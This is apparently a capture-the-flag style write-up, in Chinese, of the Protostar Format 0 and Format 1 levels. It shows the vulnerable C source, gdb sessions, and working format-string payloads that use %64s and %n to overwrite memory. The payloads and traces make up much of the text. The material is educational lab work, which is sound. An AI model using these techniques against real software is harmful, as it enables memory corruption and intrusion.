---
title: Exploit Education：Protostar - Format
---

> The levels to be exploited can be found in the /opt/protostar/bin directory.

## Format 0

> This level should be done in less than 10 bytes of input

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);  // int sprintf(char *str, const char *format, ...);
  
  if(target == 0xdeadbeef) {
      printf("you have hit the target correctly :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

- 首先还是测一下需要覆盖的位置

    ```bash
    $ gdb ./format0
    (gdb) set disassembly-flavor intel
    (gdb) disassemble vuln
    Dump of assembler code for function vuln:
    0x080483f4 <vuln+0>:	push   ebp
    0x080483f5 <vuln+1>:	mov    ebp,esp
    0x080483f7 <vuln+3>:	sub    esp,0x68
    0x080483fa <vuln+6>:	mov    DWORD PTR [ebp-0xc],0x0
    0x08048401 <vuln+13>:	mov    eax,DWORD PTR [ebp+0x8]
    0x08048404 <vuln+16>:	mov    DWORD PTR [esp+0x4],eax
    0x08048408 <vuln+20>:	lea    eax,[ebp-0x4c]
    0x0804840b <vuln+23>:	mov    DWORD PTR [esp],eax
    0x0804840e <vuln+26>:	call   0x8048300 <sprintf@plt>
    0x08048413 <vuln+31>:	mov    eax,DWORD PTR [ebp-0xc]
    0x08048416 <vuln+34>:	cmp    eax,0xdeadbeef
    0x0804841b <vuln+39>:	jne    0x8048429 <vuln+53>
    0x0804841d <vuln+41>:	mov    DWORD PTR [esp],0x8048510
    0x08048424 <vuln+48>:	call   0x8048330 <puts@plt>
    0x08048429 <vuln+53>:	leave  
    0x0804842a <vuln+54>:	ret    
    End of assembler dump.
    (gdb) break *0x0804840e
    (gdb) define hook-stop
    Type commands for definition of "hook-stop".
    End with a line saying just "end".
    >x/1i $eip
    >end
    (gdb) r $(cat /tmp/test)
    Starting program: /opt/protostar/bin/format0 $(cat /tmp/test)
    0x804840e <vuln+26>:	call   0x8048300 <sprintf@plt>

    Breakpoint 1, 0x0804840e in vuln (
        string=0xbffff84b "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ") at format0/format0.c:13
    13	in format0/format0.c
    (gdb) ni
    0x8048413 <vuln+31>:	mov    eax,DWORD PTR [ebp-0xc]
    15	in format0/format0.c
    (gdb) si
    0x8048416 <vuln+34>:	cmp    eax,0xdeadbeef
    0x08048416	15	in format0/format0.c
    (gdb) info registers 
    eax            0x51515151	1364283729  # Q
    ...
    ```

- `sprintf` 并不会检查格式字符串需要的参数与实际提供的参数是否匹配，只是根据格式字符串从栈中取参数

### Exploit

```py
import struct
target = struct.pack('I', 0xdeadbeef)
print '%64s' + target
```

```bash
$ ./format0 $(python /tmp/format.py)
you have hit the target correctly :)
```

## Format 1

> modify arbitrary memory locations

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln(char *string)
{
  printf(string);
  
  if(target) {
      printf("you have modified the target :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

- `printf` 与 `sprintf` 类似，只是根据格式字符串从栈中取参数
    - 可用于查看内存信息

> man 3 printf
> 
> Code such as printf(foo); If foo comes from untrusted user input, it may contain %n, causing the printf() call to write to memory and creating a security hole.

- `%n` 用于将先前已经打印的字符数量存储于指针指向的整型变量
- 获取变量 `target` 的地址

    ```bash
    $ objdump -t format1 | grep target
    08049638 g     O .bss	00000004              target
    ```

- 函数参数将压入栈中，若 `08049638` 无法直接在栈上找到，可以通过传参控制
- 不同长度的传参也影响着栈，需要尝试不同的长度使得 ESP 与字符串起始地址的差值为 $4$ 的倍数，从而能恰好读到 `08049638`

    ```bash
    $ gdb ./format1
    (gdb) set disassembly-flavor intel
    (gdb) disassemble main
    Dump of assembler code for function main:
    0x0804841c <main+0>:	push   ebp
    0x0804841d <main+1>:	mov    ebp,esp
    0x0804841f <main+3>:	and    esp,0xfffffff0
    0x08048422 <main+6>:	sub    esp,0x10
    0x08048425 <main+9>:	mov    eax,DWORD PTR [ebp+0xc]
    0x08048428 <main+12>:	add    eax,0x4
    0x0804842b <main+15>:	mov    eax,DWORD PTR [eax]
    0x0804842d <main+17>:	mov    DWORD PTR [esp],eax
    0x08048430 <main+20>:	call   0x80483f4 <vuln>
    0x08048435 <main+25>:	leave  
    0x08048436 <main+26>:	ret    
    End of assembler dump.
    (gdb) break *0x08048430
    Breakpoint 1 at 0x8048430: file format1/format1.c, line 19.
    (gdb) disassemble vuln
    Dump of assembler code for function vuln:
    0x080483f4 <vuln+0>:	push   ebp
    0x080483f5 <vuln+1>:	mov    ebp,esp
    0x080483f7 <vuln+3>:	sub    esp,0x18
    0x080483fa <vuln+6>:	mov    eax,DWORD PTR [ebp+0x8]
    0x080483fd <vuln+9>:	mov    DWORD PTR [esp],eax
    0x08048400 <vuln+12>:	call   0x8048320 <printf@plt>
    0x08048405 <vuln+17>:	mov    eax,ds:0x8049638
    0x0804840a <vuln+22>:	test   eax,eax
    0x0804840c <vuln+24>:	je     0x804841a <vuln+38>
    0x0804840e <vuln+26>:	mov    DWORD PTR [esp],0x8048500
    0x08048415 <vuln+33>:	call   0x8048330 <puts@plt>
    0x0804841a <vuln+38>:	leave  
    0x0804841b <vuln+39>:	ret    
    End of assembler dump.
    (gdb) break *0x08048400
    Breakpoint 2 at 0x8048400: file format1/format1.c, line 10.
    (gdb) define hook-stop
    >x/1i $eip
    >end
    ```

    ??? note "'%x' * 10"

        ```bash
        (gdb) r "`python -c "print('%x' * 10)"`"
        Starting program: /opt/protostar/bin/format1 "`python -c "print('%x' * 10)"`"
        0x8048430 <main+20>:	call   0x80483f4 <vuln>

        Breakpoint 1, 0x08048430 in main (argc=2, argv=0xbffff744) at format1/format1.c:19
        19	in format1/format1.c
        (gdb) x/wx $esp
        0xbffff680:	0xbffff89f
        (gdb) c
        Continuing.
        0x8048400 <vuln+12>:	call   0x8048320 <printf@plt>

        Breakpoint 2, 0x08048400 in vuln (string=0xbffff89f "%x%x%x%x%x%x%x%x%x%x")
            at format1/format1.c:10
        10	in format1/format1.c
        (gdb) x/10wx $esp
        # (0xbffff89f - 0xbffff660) % 4 = 3
        0xbffff660:	0xbffff89f	0x0804960c	0xbffff698	0x08048469
        0xbffff670:	0xb7fd8304	0xb7fd7ff4	0xbffff698	0x08048435
        0xbffff680:	0xbffff89f	0xb7ff1040
        (gdb) c
        Continuing.
        804960cbffff6988048469b7fd8304b7fd7ff4bffff6988048435bffff89fb7ff1040804845b
        Program exited normally.
        ```

    ??? note "'%x ' * 10"

        ```bash
        (gdb) r "`python -c "print('%x ' * 10)"`"
        Starting program: /opt/protostar/bin/format1 "`python -c "print('%x ' * 10)"`"
        0x8048430 <main+20>:	call   0x80483f4 <vuln>

        Breakpoint 1, 0x08048430 in main (argc=2, argv=0xbffff734) at format1/format1.c:19
        19	in format1/format1.c
        (gdb) x/wx $esp
        0xbffff670:	0xbffff895
        (gdb) c
        Continuing.
        0x8048400 <vuln+12>:	call   0x8048320 <printf@plt>

        Breakpoint 2, 0x08048400 in vuln (string=0xbffff895 "%x %x %x %x %x %x %x %x %x %x ")
            at format1/format1.c:10
        10	in format1/format1.c
        (gdb) x/16wx $esp
        0xbffff650:	0xbffff895	0x0804960c	0xbffff688	0x08048469
        0xbffff660:	0xb7fd8304	0xb7fd7ff4	0xbffff688	0x08048435
        0xbffff670:	0xbffff895	0xb7ff1040	0x0804845b	0xb7fd7ff4
        0xbffff680:	0x08048450	0x00000000	0xbffff708	0xb7eadc76
        (gdb) c
        Continuing.
        804960c bffff688 8048469 b7fd8304 b7fd7ff4 bffff688 8048435 bffff895 b7ff1040 804845b 
        Program exited normally.
        ```

### Exploit

```bash
$ ./format1 "$(python -c "print 'A' * 4 + '\x38\x96\x04\x08' + 'B' * 7 + '%x' * 135 + '%n'")"
AAAA8BBBBBBB804960cbffff5d88048469b7fd8304b7fd7ff4bffff5d88048435bffff7bcb7ff1040804845bb7fd7ff480484500bffff658b7eadc762bffff684bffff690b7fe1848bffff640ffffffffb7ffeff4804824d1bffff640b7ff0626b7fffab0b7fe1b28b7fd7ff400bffff658e8c9752abb7f65000280483400b7ff6210b7eadb9bb7ffeff42804834008048361804841c2bffff68480484508048440b7ff1040bffff67cb7fff8f82bffff7b2bffff7bc0bffff8dcbffff8f1bffff908bffff920bffff92ebffff942bffff963bffff97abffff98dbffff997bffffe87bffffea0bffffedebffffef2bfffff10bfffff27bfffff38bfffff53bfffff5bbfffff6bbfffff78bfffffacbfffffc0bfffffd4bfffffe6020b7fe241421b7fe200010178bfbbf61000116438048034420577b7fe30008098048340b3e9c0d3e9e3e917119bffff79b1fbffffff2fbffff7ab00120000008433fc8b69057f81755be21d6923a08e3638362f2e00006d726f6631746141414141you have modified the target :)
```